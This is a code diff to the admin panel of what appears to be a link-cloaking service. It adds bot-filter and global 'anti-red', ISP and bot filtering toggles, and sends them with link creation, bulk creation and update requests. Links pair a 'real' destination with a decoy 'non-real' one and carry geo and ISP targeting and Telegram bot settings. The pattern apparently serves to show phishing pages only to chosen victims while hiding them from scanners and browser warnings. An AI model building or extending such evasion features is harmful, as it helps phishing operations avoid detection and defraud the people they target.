@@ -1096,6 +1096,13 @@
                             </div>
                             <div class="toggle-group">
                                 <label class="switch">
+                                    <input type="checkbox" id="newBotFilter" checked>
+                                    <span class="slider"></span>
+                                </label>
+                                <span>BOT_FILTER</span>
+                            </div>
+                            <div class="toggle-group">
+                                <label class="switch">
                                     <input type="checkbox" id="newReallowVisited" checked>
                                     <span class="slider"></span>
                                 </label>
@@ -1173,6 +1180,34 @@
             <h2>GLOBAL_SECURITY_PROTOCOL</h2>
             <div style="max-width: 600px;">
                 <p style="font-size: 12px; color: var(--text-muted); margin-bottom: 20px;">Manage global filtering parameters and operational states.</p>
+                <div class="toggle-group">
+                    <label class="switch">
+                        <input type="checkbox" id="globalAntiRed">
+                        <span class="slider"></span>
+                    </label>
+                    <span>GLOBAL_ANTI_RED</span>
+                </div>
+                <div class="toggle-group">
+                    <label class="switch">
+                        <input type="checkbox" id="globalIspFilter">
+                        <span class="slider"></span>
+                    </label>
+                    <span>GLOBAL_ISP_FILTER</span>
+                </div>
+                <div class="toggle-group">
+                    <label class="switch">
+                        <input type="checkbox" id="globalBotFilter">
+                        <span class="slider"></span>
+                    </label>
+                    <span>GLOBAL_BOT_FILTER</span>
+                </div>
+                <div class="toggle-group">
+                    <label class="switch">
+                        <input type="checkbox" id="globalReallowVisited">
+                        <span class="slider"></span>
+                    </label>
+                    <span>GLOBAL_REALLOW_VISITED</span>
+                </div>
                 <div class="toggle-group">
                     <label class="switch">
                         <input type="checkbox" id="allowAfrica">
@@ -1528,6 +1563,18 @@
                 document.getElementById('botToken').value = userSettings.botToken || '';
                 document.getElementById('chatId').value = userSettings.chatId || '';
                 
+                if (document.getElementById('globalAntiRed')) {
+                    document.getElementById('globalAntiRed').checked = userSettings.antiRed !== false;
+                }
+                if (document.getElementById('globalIspFilter')) {
+                    document.getElementById('globalIspFilter').checked = userSettings.ispFilter !== false;
+                }
+                if (document.getElementById('globalBotFilter')) {
+                    document.getElementById('globalBotFilter').checked = userSettings.botFilter !== false;
+                }
+                if (document.getElementById('globalReallowVisited')) {
+                    document.getElementById('globalReallowVisited').checked = userSettings.reallowVisited === true;
+                }
                 if (document.getElementById('allowAfrica')) {
                     document.getElementById('allowAfrica').checked = userSettings.allowAfrica === true;
                 }
@@ -1794,6 +1841,7 @@
 
             document.getElementById('newAntiRed').checked = link.antiRed !== false;
             document.getElementById('newIspFilter').checked = link.ispFilter !== false;
+            document.getElementById('newBotFilter').checked = link.botFilter !== false;
             document.getElementById('newReallowVisited').checked = link.reallowVisited !== false;
             document.getElementById('newAllowAfrica').checked = link.allowAfrica === true;
             document.getElementById('newAllowEurope').checked = link.allowEurope !== false;
@@ -1818,6 +1866,7 @@
 
             document.getElementById('newAntiRed').checked = true;
             document.getElementById('newIspFilter').checked = true;
+            document.getElementById('newBotFilter').checked = true;
             document.getElementById('newReallowVisited').checked = true;
             document.getElementById('newAllowAfrica').checked = false;
             document.getElementById('newAllowEurope').checked = true;
@@ -1867,6 +1916,7 @@
             const slug = document.getElementById('newCustomSlug').value.trim();
             const antiRed = document.getElementById('newAntiRed').checked;
             const ispFilter = document.getElementById('newIspFilter').checked;
+            const botFilter = document.getElementById('newBotFilter').checked;
             const mobileIsps = getNewLinkSelectedIsps();
             const reallowVisited = document.getElementById('newReallowVisited').checked;
             const allowAfrica = document.getElementById('newAllowAfrica').checked;
@@ -1881,7 +1931,7 @@
             const res = await fetch('/api/links', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name, realLink, nonRealLink, slug, antiRed, ispFilter, mobileIsps, reallowVisited, duration, allowAfrica, allowEurope })
+                body: JSON.stringify({ name, realLink, nonRealLink, slug, antiRed, ispFilter, botFilter, mobileIsps, reallowVisited, duration, allowAfrica, allowEurope })
             });
 
             if (res.ok) {
@@ -1899,6 +1949,7 @@
             const duration = document.getElementById('planDuration').value;
             const antiRed = document.getElementById('newAntiRed').checked;
             const ispFilter = document.getElementById('newIspFilter').checked;
+            const botFilter = document.getElementById('newBotFilter').checked;
             const mobileIsps = getNewLinkSelectedIsps();
             const reallowVisited = document.getElementById('newReallowVisited').checked;
             const statusEl = document.getElementById('bulkStatus');
@@ -1915,7 +1966,7 @@
                 const res = await fetch('/api/links/bulk', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ text, duration, antiRed, ispFilter, mobileIsps, reallowVisited })
+                    body: JSON.stringify({ text, duration, antiRed, ispFilter, botFilter, mobileIsps, reallowVisited })
                 });
 
                 const data = await res.json();
@@ -1950,6 +2001,7 @@
             const slug = document.getElementById('newCustomSlug').value.trim();
             const antiRed = document.getElementById('newAntiRed').checked;
             const ispFilter = document.getElementById('newIspFilter').checked;
+            const botFilter = document.getElementById('newBotFilter').checked;
             const mobileIsps = getNewLinkSelectedIsps();
             const reallowVisited = document.getElementById('newReallowVisited').checked;
             const allowAfrica = document.getElementById('newAllowAfrica').checked;
@@ -1958,7 +2010,7 @@
             const res = await fetch('/api/links/' + oldSlug, {
                 method: 'PUT',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ name, realLink, nonRealLink, slug, antiRed, ispFilter, mobileIsps, reallowVisited, allowAfrica, allowEurope })
+                body: JSON.stringify({ name, realLink, nonRealLink, slug, antiRed, ispFilter, botFilter, mobileIsps, reallowVisited, allowAfrica, allowEurope })
             });
 
             if (res.ok) {
@@ -2388,10 +2440,11 @@
                 // Keep existing link settings
                 nonRealLink: currentUser.settings.nonRealLink,
                 realLink: currentUser.settings.realLink,
-                antiRed: currentUser.settings.antiRed,
-                ispFilter: currentUser.settings.ispFilter,
+                antiRed: document.getElementById('globalAntiRed').checked,
+                ispFilter: document.getElementById('globalIspFilter').checked,
+                botFilter: document.getElementById('globalBotFilter').checked,
+                reallowVisited: document.getElementById('globalReallowVisited').checked,
                 mobileIsps: currentUser.settings.mobileIsps,
-                reallowVisited: currentUser.settings.reallowVisited,
                 allowAfrica: document.getElementById('allowAfrica').checked,
                 allowEurope: document.getElementById('allowEurope').checked
             };
